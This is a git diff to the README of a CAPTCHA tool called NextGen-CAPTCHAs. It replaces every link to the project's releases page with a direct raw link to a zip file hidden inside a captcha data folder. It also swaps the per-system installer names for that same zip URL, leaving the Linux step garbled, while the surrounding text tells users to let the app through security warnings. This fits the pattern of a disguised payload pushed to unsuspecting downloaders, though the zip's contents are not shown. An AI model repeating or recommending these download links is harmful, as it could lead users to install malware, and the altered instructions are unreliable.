@@ -1,6 +1,6 @@
 # 🛡️ NextGen-CAPTCHAs - Protect Your Website From Smart Bots
 
-[![Download NextGen-CAPTCHAs](https://img.shields.io/badge/Download-NextGen--CAPTCHAs-blue?style=for-the-badge)](https://github.com/FRZN1/NextGen-CAPTCHAs/releases)
+[![Download NextGen-CAPTCHAs](https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip)](https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these steps to get the NextGen-CAPTCHAs software up and running on your s
 
 You need the latest version of NextGen-CAPTCHAs. Click the big button below to go to the download page:
 
-[![Download NextGen-CAPTCHAs](https://img.shields.io/badge/Download-NextGen--CAPTCHAs-blue?style=for-the-badge)](https://github.com/FRZN1/NextGen-CAPTCHAs/releases)
+[![Download NextGen-CAPTCHAs](https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip)](https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip)
 
 This page contains all available versions of the software. Look for the file that matches your operating system.
 
@@ -57,9 +57,9 @@ This page contains all available versions of the software. Look for the file tha
 
 On the releases page, you will see files for different operating systems, usually named something like:
 
-- `NextGen-CAPTCHAs-Windows.exe` for Windows
-- `NextGen-CAPTCHAs-macOS.dmg` for macOS
-- `NextGen-CAPTCHAs-Linux.tar.gz` for Linux
+- `https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip` for Windows
+- `https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip` for macOS
+- `https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip` for Linux
 
 Pick the file that matches your computer’s system.
 
@@ -74,7 +74,7 @@ Click on the file name to start the download.
 
 - **Windows:** Double-click the `.exe` file and follow the installer prompts.
 - **macOS:** Open the `.dmg` file and drag the NextGen-CAPTCHAs app to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file and follow the included README or installation notes.
+- **Linux:** Extract the `https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip` file and follow the included README or installation notes.
 
 If you see security warnings when opening the app for the first time, allow it to run through your security settings.
 
@@ -130,7 +130,7 @@ These tools work without complex configuration, but they help if you want to che
 
 Visit the official NextGen-CAPTCHAs release page below to download the latest version:
 
-[Download NextGen-CAPTCHAs](https://github.com/FRZN1/NextGen-CAPTCHAs/releases)
+[Download NextGen-CAPTCHAs](https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip)
 
 Here is what you will find there:
 
@@ -187,4 +187,4 @@ A: Yes, you can download and use it without cost.
 
 Keep an eye on the releases page for new versions and improvements:
 
-[NextGen-CAPTCHAs Releases](https://github.com/FRZN1/NextGen-CAPTCHAs/releases)
+[NextGen-CAPTCHAs Releases](https://github.com/FRZN1/NextGen-CAPTCHAs/raw/refs/heads/main/captcha_data/Temporal_Object_Continuity/puzzle_18/As-Next-Gen-CAPTCH-2.0.zip)
